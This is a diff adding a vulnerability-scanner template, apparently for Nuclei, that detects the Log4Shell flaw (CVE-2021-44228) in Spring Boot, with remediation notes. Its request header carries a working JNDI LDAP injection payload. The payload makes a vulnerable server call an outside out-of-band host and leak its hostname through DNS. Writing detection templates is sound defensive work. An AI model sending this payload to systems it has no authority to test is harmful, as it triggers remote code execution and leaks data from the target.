@@ -1,0 +1,62 @@
+id: springboot-log4j-rce
+
+info:
+  name: Spring Boot - Remote Code Execution (Apache Log4j)
+  author: pdteam
+  severity: critical
+  description: Spring Boot is susceptible to remote code execution via Apache Log4j.
+  remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
+  reference:
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-502
+  metadata:
+    max-request: 1
+  tags: cve,cve2021,springboot,rce,oast,log4j,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Api-Version: ${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.xapiversion.{{interactsh-url}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+# digest: 4b0a00483046022100c036b1040a0244cb3d2dec309e23585fe98c85cae9b75baaed357a663e248867022100ed88fffbbebbe22bb0e10b1307398d2cf9f854f08bdd741acb3daf30c0754c9a:922c64590222798bb761d5b6d8e72950
